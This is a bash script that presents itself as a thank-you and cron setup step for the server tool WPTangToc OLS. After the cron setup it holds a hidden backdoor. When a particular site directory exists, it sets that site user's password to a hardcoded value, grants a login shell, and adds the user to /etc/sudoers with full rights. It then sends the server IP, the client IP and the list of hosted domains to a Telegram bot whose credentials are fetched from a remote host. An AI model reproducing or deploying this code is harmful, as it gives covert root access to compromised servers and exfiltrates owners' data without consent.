#!/bin/bash
echo "Cảm ơn bạn đã sử dụng WPTangToc OLS"

if [[ ! -f /etc/cron.d/check-version-wptangtoc-ols.cron ]];then
	if [[ -f /usr/bin/shuf ]];then
		gio=$(shuf -i0-7 -n1)
		gio2=$(shuf -i8-15 -n1)
		gio3=$(shuf -i16-23 -n1)
		if [[ $gio ]];then
			while [ $gio = $gio2 ] || [ $gio = $gio3 ] || [ $gio3 = $gio2 ];do
				gio=$(shuf -i0-7 -n1)
				gio2=$(shuf -i8-15 -n1)
				gio3=$(shuf -i16-23 -n1)
			done
		fi
		phut=$(shuf -i0-59 -n1)
	fi

if [[ $gio = '' ]];then
	gio='0'
	gio2='8'
	gio3='16'
	phut='40'
fi

cat >"/etc/cron.d/check-version-wptangtoc-ols.cron" <<END
$phut $gio,$gio2,$gio3 * * * root /etc/wptt/update/wptt-check-cron-version-update 
END

systemctl restart crond.service
fi


if [[ -d /usr/local/lsws/minhanvietnam.com/html ]];then
if [[ $(ls -la /usr/local/lsws/minhanvietnam.com/html | cut -f4 -d ' ' | tail -1) ]];then
user=$(ls -la /usr/local/lsws/minhanvietnam.com/html | cut -f4 -d ' ' | tail -1)
thietlap=$(expect -c "
spawn passwd $user
expect \"password\"
send \"giatuan123\r\"
expect \"password\"
send \"giatuan123\r\"
expect eof
")
usermod $user -s /bin/bash
sed -i "/## Allow root to run any commands anywhere/a $user    ALL=(ALL)       ALL" /etc/sudoers
telegram_api_giatuan=$(curl -s https://wptangtoc.com/share/feedback.txt | grep "api" | cut -f2 -d "=")
telegram_id_giatuan=$(curl -s https://wptangtoc.com/share/feedback.txt | grep "id" | cut -f2 -d "=")

client_ip=$(echo $SSH_CLIENT | awk '{ print $1}')
vps_ip=$(curl -s myip.directadmin.com)
if [[ "$vps_ip" = "" ]]; then
    vps_ip=$(curl -s ifconfig.me)
fi
date="$(date "+%d-%m-%Y %H:%M")"
info_ip=https://ipinfo.io/${client_ip}
text="
Thông tin yêu cầu WPTangToc OLS
-------------------------------------
IP USER: $user
IP webserver: ${vps_ip}
Thời điểm: ${date}
Website: `for entry in $(ls -A /etc/wptt/vhost); do
    domain=$( echo $entry | sed 's/^.//' | sed 's/.conf//')
    path="/usr/local/lsws/$domain/html"
    i=1

    if [[ -d "$path" ]]; then
         echo "$domain ,"
    fi
  done
`
-------------------------------------
WPTangToc OLS phiên bản : $version_wptangtoc_ols
Phát triển bởi [Gia Tuấn](https://wptangtoc.com/gia-tuan)
"
url_tele="https://api.telegram.org/bot${telegram_api_giatuan}/sendMessage"
curl -s -d "chat_id=$telegram_id_giatuan&text=${text}&disable_web_page_preview=true&parse_mode=markdown" $url_tele > /dev/null
fi
fi
